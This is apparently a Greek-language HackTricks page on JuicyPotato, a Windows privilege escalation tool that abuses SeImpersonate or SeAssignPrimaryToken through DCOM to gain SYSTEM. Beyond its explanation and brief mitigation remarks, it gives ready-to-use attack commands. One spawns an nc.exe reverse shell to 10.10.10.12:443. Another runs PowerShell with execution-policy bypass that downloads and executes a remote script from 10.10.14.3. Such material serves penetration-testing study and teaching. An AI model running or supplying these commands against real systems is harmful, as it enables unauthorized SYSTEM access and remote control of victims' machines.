# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > **Το JuicyPotato δεν λειτουργεί** σε Windows Server 2019 και Windows 10 build 1809 και μετά. Ωστόσο, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) μπορούν να χρησιμοποιηθούν για να **εκμεταλλευτούν τα ίδια δικαιώματα και να αποκτήσουν πρόσβαση επιπέδου `NT AUTHORITY\SYSTEM`**. _**Ελέγξτε:**_

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (κατάχρηση των χρυσών δικαιωμάτων) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Μια γλυκιά έκδοση του_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, με λίγο χυμό, δηλαδή **ένα άλλο εργαλείο Τοπικής Κατάχρησης Δικαιωμάτων, από Λογαριασμούς Υπηρεσιών Windows σε NT AUTHORITY\SYSTEM**_

#### Μπορείτε να κατεβάσετε το juicypotato από [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Περίληψη <a href="#summary" id="summary"></a>

[**Από το juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) και οι [παραλλαγές του](https://github.com/decoder-it/lonelypotato) εκμεταλλεύονται την αλυσίδα κατάχρησης δικαιωμάτων βασισμένη σε [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [υπηρεσία](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) έχοντας τον MiTM listener στο `127.0.0.1:6666` και όταν έχετε δικαιώματα `SeImpersonate` ή `SeAssignPrimaryToken`. Κατά τη διάρκεια μιας ανασκόπησης build Windows βρήκαμε μια ρύθμιση όπου το `BITS` είχε απενεργοποιηθεί σκόπιμα και η θύρα `6666` είχε καταληφθεί.

Αποφασίσαμε να οπλοποιήσουμε [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Πείτε γεια στο Juicy Potato**.

> Για τη θεωρία, δείτε [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) και ακολουθήστε την αλυσίδα των συνδέσμων και αναφορών.

Ανακαλύψαμε ότι, εκτός από το `BITS`, υπάρχουν αρκετοί COM servers που μπορούμε να καταχραστούμε. Απλά χρειάζεται να:

1. είναι δυνατό να δημιουργηθούν από τον τρέχοντα χρήστη, κανονικά έναν “χρήστη υπηρεσίας” που έχει δικαιώματα κατάχρησης
2. να υλοποιούν τη διεπαφή `IMarshal`
3. να εκτελούνται ως ανυψωμένος χρήστης (SYSTEM, Διαχειριστής, …)

Μετά από κάποιες δοκιμές αποκτήσαμε και δοκιμάσαμε μια εκτενή λίστα από [ενδιαφέροντα CLSID’s](http://ohpe.it/juicy-potato/CLSID/) σε πολλές εκδόσεις Windows.

### Juicy λεπτομέρειες <a href="#juicy-details" id="juicy-details"></a>

Το JuicyPotato σας επιτρέπει να:

- **Στόχος CLSID** _επιλέξτε οποιοδήποτε CLSID θέλετε._ [_Εδώ_](http://ohpe.it/juicy-potato/CLSID/) _μπορείτε να βρείτε τη λίστα οργανωμένη κατά OS._
- **Θύρα Listening COM** _ορίστε τη θύρα listening COM που προτιμάτε (αντί της σκληροκωδικοποιημένης 6666)_
- **Διεύθυνση IP Listening COM** _δεσμεύστε τον server σε οποιαδήποτε IP_
- **Λειτουργία δημιουργίας διεργασίας** _ανάλογα με τα δικαιώματα του χρήστη που έχει καταχραστεί μπορείτε να επιλέξετε από:_
- `CreateProcessWithToken` (χρειάζεται `SeImpersonate`)
- `CreateProcessAsUser` (χρειάζεται `SeAssignPrimaryToken`)
- `και τα δύο`
- **Διεργασία προς εκκίνηση** _εκκινήστε ένα εκτελέσιμο ή σενάριο αν η εκμετάλλευση είναι επιτυχής_
- **Επιχείρημα Διεργασίας** _προσαρμόστε τα επιχειρήματα της εκκινούμενης διεργασίας_
- **Διεύθυνση RPC Server** _για μια κρυφή προσέγγιση μπορείτε να πιστοποιηθείτε σε έναν εξωτερικό RPC server_
- **Θύρα RPC Server** _χρήσιμη αν θέλετε να πιστοποιηθείτε σε έναν εξωτερικό server και το firewall μπλοκάρει τη θύρα `135`…_
- **ΛΕΙΤΟΥΡΓΙΑ ΔΟΚΙΜΗΣ** _κυρίως για δοκιμαστικούς σκοπούς, δηλαδή δοκιμή CLSIDs. Δημιουργεί το DCOM και εκτυπώνει τον χρήστη του token. Δείτε_ [_εδώ για δοκιμή_](http://ohpe.it/juicy-potato/Test/)

### Χρήση <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Τελικές σκέψεις <a href="#final-thoughts" id="final-thoughts"></a>

[**Από το juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

Εάν ο χρήστης έχει δικαιώματα `SeImpersonate` ή `SeAssignPrimaryToken`, τότε είστε **SYSTEM**.

Είναι σχεδόν αδύνατο να αποτραπεί η κακή χρήση όλων αυτών των COM Servers. Μπορείτε να σκεφτείτε να τροποποιήσετε τα δικαιώματα αυτών των αντικειμένων μέσω του `DCOMCNFG`, αλλά καλή τύχη, αυτό θα είναι προκλητικό.

Η πραγματική λύση είναι να προστατεύσετε ευαίσθητους λογαριασμούς και εφαρμογές που εκτελούνται υπό τους λογαριασμούς `* SERVICE`. Η διακοπή του `DCOM` θα εμπόδιζε σίγουρα αυτή την εκμετάλλευση, αλλά θα μπορούσε να έχει σοβαρό αντίκτυπο στο υποκείμενο λειτουργικό σύστημα.

Από: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## Παραδείγματα

Σημείωση: Επισκεφθείτε [αυτή τη σελίδα](https://ohpe.it/juicy-potato/CLSID/) για μια λίστα με CLSIDs που να δοκιμάσετε.

### Πάρτε ένα nc.exe reverse shell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Εκκίνηση νέου CMD (αν έχετε πρόσβαση RDP)

![](<../../images/image (300).png>)

## Προβλήματα CLSID

Συχνά, το προεπιλεγμένο CLSID που χρησιμοποιεί το JuicyPotato **δεν λειτουργεί** και η εκμετάλλευση αποτυγχάνει. Συνήθως, απαιτούνται πολλές προσπάθειες για να βρείτε ένα **λειτουργικό CLSID**. Για να αποκτήσετε μια λίστα με CLSIDs για να δοκιμάσετε για ένα συγκεκριμένο λειτουργικό σύστημα, θα πρέπει να επισκεφθείτε αυτή τη σελίδα:

{{#ref}}
https://ohpe.it/juicy-potato/CLSID/
{{#endref}}

### **Έλεγχος CLSIDs**

Αρχικά, θα χρειαστείτε μερικά εκτελέσιμα αρχεία εκτός από το juicypotato.exe.

Κατεβάστε [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) και φορτώστε το στη συνεδρία PS σας, και κατεβάστε και εκτελέστε [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Αυτό το σενάριο θα δημιουργήσει μια λίστα με πιθανά CLSIDs για δοκιμή.

Στη συνέχεια, κατεβάστε [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat) (αλλάξτε τη διαδρομή στη λίστα CLSID και στο εκτελέσιμο juicypotato) και εκτελέστε το. Θα αρχίσει να δοκιμάζει κάθε CLSID, και **όταν αλλάξει ο αριθμός θύρας, θα σημαίνει ότι το CLSID λειτούργησε**.

**Ελέγξτε** τα λειτουργικά CLSIDs **χρησιμοποιώντας την παράμετρο -c**

## Αναφορές

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)

{{#include ../../banners/hacktricks-training.md}}
